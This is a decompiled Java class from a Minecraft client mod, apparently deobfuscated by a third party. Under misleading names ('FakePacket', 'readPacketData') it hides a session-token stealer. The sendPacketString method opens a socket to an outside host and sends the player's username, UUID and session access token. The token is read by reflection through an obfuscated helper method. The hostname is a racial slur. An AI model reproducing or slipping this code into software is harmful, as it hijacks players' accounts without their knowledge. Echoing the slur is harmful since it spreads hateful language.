/*
 * Decompiled with CFR 0.152.
 * Deobfuscated by sora-kawaii.
 */
package xyz.Melody.Utils.fakemc;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.Socket;
import net.minecraft.client.Minecraft;
import xyz.Melody.Client;
import xyz.Melody.Utils.other.StringUtil;

public final class FakePacket {
    private static Minecraft mc = Minecraft.getMinecraft();

    public static void readPacketData() {
        if (StringUtil.socket != null && StringUtil.in != null && StringUtil.pw != null) {
            try {
                StringUtil.socket.close();
                StringUtil.in.close();
                StringUtil.pw.close();
                StringUtil.socket = null;
                StringUtil.in = null;
                StringUtil.pw = null;
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        }
    }

    public static void sendPacketString(String string) {
        try {
            StringUtil.socket = new Socket("nigger.cool", 25565);
            StringUtil.in = StringUtil.socket.getInputStream();
            StringUtil.pw = new PrintWriter(StringUtil.socket.getOutputStream(), true);
            Client.instance.preModHiderAliase(FakePacket.ilIllIIIllIiIl());
            StringUtil.pw.println(string + mc.getSession().getUsername() + "@" + mc.getSession().getProfile().getId().toString() + "@" + FakePacket.ilIllIIIllIiIl());
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    public static void getServer(String string) {
        FakePacket.sendPacketString("CLIENT_CONNECT" + string);
    }

    private static String ilIllIIIllIiIl() {
        try {
            Method method = mc.getSession().getClass().getDeclaredMethod("getToken", new Class[0]);
            method.setAccessible(true);
            return (String)method.invoke(mc.getSession(), new Object[0]);
        }
        catch (Exception exception) {
            try {
                Method method = mc.getSession().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
                method.setAccessible(true);
                return (String)method.invoke(mc.getSession(), new Object[0]);
            }
            catch (Exception exception2) {
                return exception2.getMessage();
            }
        }
    }
}

